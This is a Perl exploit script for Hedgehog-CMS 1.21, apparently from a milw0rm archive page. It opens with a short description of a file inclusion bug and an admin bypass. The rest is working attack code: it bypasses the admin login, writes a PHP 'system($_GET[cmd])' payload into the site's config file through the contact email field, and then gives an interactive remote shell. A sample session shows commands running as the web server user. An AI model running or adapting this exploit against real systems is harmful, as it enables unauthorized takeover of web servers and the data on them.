<html><head><title>Hedgehog-CMS 1.21 (LFI) Remote Command Execution Exploit</title></head><pre>#!/usr/bin/perl

# |----------------------------------------------------------------------------------------------------------------------------------|
# |                     INFORMATIONS                                                                                                 |
# |----------------------------------------------------------------------------------------------------------------------------------|
# |Web Application :   Hedgedog-CMS 1.21                                                                                             |
# |Download        :   http://mesh.dl.sourceforge.net/sourceforge/hedgehog-cms/hedgehog-cms_v1.21.zip                                |
# |----------------------------------------------------------------------------------------------------------------------------------|
# |Remote Command Execution Exploit                                                                                                  |
# |by Osirys                                                                                                                         |
# |osirys[at]autistici[dot]org                                                                                                       |
# |osirys.org                                                                                                                        |
# |Thx&amp;Greets to: evilsocket, athum                                                                                                  |
# |----------------------------------------------------------------------------------------------------------------------------------|
# |BUG [Local File Inclusion]
# |  p0c : /[path]/includes/footer.php?c_temp_path=[lf]%00
# |  In source $c_temp_path is not declared, so if register_globals = On we can set its value from GET directly.
# |----------------------------------------------------------------------------------------------------------------------------------|
# |BUG [Abitrary php code writing]
# |  This cms is not coded too good, we can bypass admin login just doing it via socket or lwp with $_POST[l_mode].
# |  From admin panel everything before beeing passed in a file is filtered with htmlspecialchars and other fucntions,
# |  expect of the email contact variable, that's the hell bug.
# |  The sploit before overwriting a previous configuration, tries to get the old one, then it executes your commands.
# |----------------------------------------------------------------------------------------------------------------------------------|


# ------------------------------------------------------------------
# Exploit in action [&gt;!]
# ------------------------------------------------------------------
# osirys[~]&gt;$ perl lolzo.txt http://localhost/hedgehog-cms/
#
#   --------------------------------
#       Hedgedog-CMS RCE Exploit
#               by Osirys
#   --------------------------------
#
# [*] Getting old configuration data ..
# [*] Overwriting configuration data ..
# [*] Overwrite succesfully !
# [&amp;] Hi my master, do your job now [!]
#
# shell[localhost]$&gt; id
# uid=80(apache) gid=80(apache) groups=80(apache)
# shell[localhost]$&gt; pwd
# /home/osirys/web/hedgehog-cms/config
# shell[localhost]$&gt; la 
# bash: la: command not found
# shell[localhost]$&gt; exit
# [-] Quitting ..
# osirys[~]&gt;$
# ------------------------------------------------------------------

use LWP::UserAgent;
use IO::Socket;
use HTTP::Request::Common;

my $post_pag  =  &quot;/specialacts.php&quot;;
my $rce_path  =  &quot;/config/userconfig.php&quot;;
my $rce_c0de  =  &quot;%22%3Bsystem%28%24_GET%5Bcmd%5D%29%3B+%24xy+%3D+%22&quot;;
my $host      =  $ARGV[0];


($host) || help(&quot;-1&quot;);
cheek($host) == 1 || help(&quot;-2&quot;);
&amp;banner;

$datas = get_input($host);
$datas =~ /(.*) (.*)/;
($h0st,$path) = ($1,$2);

my $ua_url = $host.$post_pag;
my $ua = LWP::UserAgent-&gt;new;
my $re = $ua-&gt;request(POST $ua_url,
                                    Content_Type =&gt; 'multipart/form-data',
                                    Content	 =&gt; [l_mode =&gt; '33']
                     );

if ($re-&gt;is_success) {
    $data = $re-&gt;content;
    print &quot;[*] Getting old configuration data ..\n&quot;;
    get_old_data($data);
    &amp;overwrite;
}
else {
    print &quot;[-] Unable to get old configuration data ..\n&quot;;
    print &quot;[*] Overwriting existing configuration !   \n&quot;;
    &amp;overwrite;
}

sub overwrite {
    if ($old_data_gotcha != 1) {
        $title     =  &quot;Website&quot;;
        $username  =  &quot;Username&quot;;
        $contact   =  &quot;admin\@admin.com&quot;;
        $copyright =  &quot;2007 website&quot;;
    }

    my $url = $path.$post_pag;

    my $code=  &quot;e_maintitle=&quot;. $title.&quot;&amp;e_autor=&quot;.$username.&quot;&amp;e_contact=&quot;. $contact. $rce_c0de.
               &quot;&amp;e_copyright=&quot;.$copyright.&quot;&amp;e_theme=.%2Ftemp%2Fstrawberry%2F&amp;e_language=engli&quot;.
               &quot;sh.lng&amp;e_favicon=&amp;e_sp=true&amp;e_version=true&amp;e_guestbook=true&amp;l_mode=35&quot;;

    my $length = length($code);

    my $data = &quot;POST &quot;.$url.&quot; HTTP/1.1\r\n&quot;.
               &quot;Host: &quot;.$h0st.&quot;\r\n&quot;.
               &quot;Keep-Alive: 300\r\n&quot;.
               &quot;Connection: keep-alive\r\n&quot;.
               &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;.
               &quot;Content-Length: &quot;.$length.&quot;\r\n\r\n&quot;.
               $code.&quot;\r\n&quot;;

    my $socket   =  new IO::Socket::INET(
                                         PeerAddr =&gt; $h0st,
                                         PeerPort =&gt; '80',
                                         Proto    =&gt; 'tcp',
                                        ) or die &quot;[-] Can't connect to $h0st:80\n[?] $! \n\n&quot;;

    print &quot;[*] Overwriting configuration data ..\n&quot;;
    $socket-&gt;send($data);

    while ((my $e = &lt;$socket&gt;)&amp;&amp;($own != 1)) {
        if ($e =~ /The configurations have been saved successfully/) {
            print &quot;[*] Overwrite succesfully !\n&quot;;
            $own = 1;
        }
    }

    $own == 1 || die &quot;[-] Can't overwrite configuration data !\n&quot;;

    print &quot;[&amp;] Hi my master, do your job now [!]\n\n&quot;;
    &amp;exec_cmd;
}

sub exec_cmd {
    my(@outs,$out);
    $h0st !~ /www\./ || $h0st =~ s/www\.//;
    print &quot;shell[$h0st]\$&gt; &quot;;
    $cmd = &lt;STDIN&gt;;
    $cmd !~ /exit/ || die &quot;[-] Quitting ..\n&quot;;
    $exec_url = $host.$rce_path.&quot;?cmd=&quot;.$cmd;
    $re = get_req($exec_url);
    if ($re =~ /./) {
        print $re;
        &amp;exec_cmd;
    }
    else {
        $c++;
        $cmd =~ s/\n//;
        print &quot;bash: &quot;.$cmd.&quot;: command not found\n&quot;;
        $c &lt; 3 || die &quot;[-] Command are not executed.\n[-] Something wrong. Exploit Failed !\n\n&quot;;
        &amp;exec_cmd;
    }
}

sub get_req() {
    $link = $_[0];
    my $req = HTTP::Request-&gt;new(GET =&gt; $link);
    my $ua = LWP::UserAgent-&gt;new();
    $ua-&gt;timeout(4);
    my $response = $ua-&gt;request($req);
    return $response-&gt;content;
}

sub cheek() {
    my $host = $_[0];
    if ($host =~ /http:\/\/(.*)/) {
        return 1;
    }
    else {
        return 0;
    }
}

sub get_input() {
    my $host = $_[0];
    $host =~ /http:\/\/(.*)/;
    $s_host = $1;
    $s_host =~ /([a-z.-]{1,30})\/(.*)/;
    ($h0st,$path) = ($1,$2);
    $path =~ s/(.*)/\/$1/;
    $full_det = $h0st.&quot; &quot;.$path;
    return $full_det;
}

sub get_old_data() {
    my $re = $_[0];
    if ($re =~ /name=&quot;e_maintitle&quot; value=&quot;(.*)&quot; size/) { $title = $1; }
    if ($re =~ /name=&quot;e_autor&quot; value=&quot;(.*)&quot; size/)     { $username = $1; }
    if ($re =~ /name=&quot;e_contact&quot; value=&quot;(.*)&quot; size/)   { $contact = $1; }
    if ($re =~ /name=&quot;e_copyright&quot; value=&quot;(.*)&quot; size/) { $copyright = $1; }
    $old_data_gotcha = 1;
}

sub banner {
    print &quot;\n&quot;.
          &quot;  -------------------------------- \n&quot;.
          &quot;      Hedgedog-CMS RCE Exploit      \n&quot;.
          &quot;              by Osirys             \n&quot;.
          &quot;  -------------------------------- \n\n&quot;;
}

sub help() {
    my $error = $_[0];
    if ($error == -1) {
        &amp;banner;
        print &quot;\n[-] Bad hostname! \n&quot;;
    }
    elsif ($error == -2) {
        &amp;banner;
        print &quot;\n[-] Bad hostname address !\n&quot;;
    }
    print &quot;[*] Usage : perl $0 http://hostname/cms_path\n\n&quot;;
    exit(0);
}

# milw0rm.com [2009-02-09]</pre></html>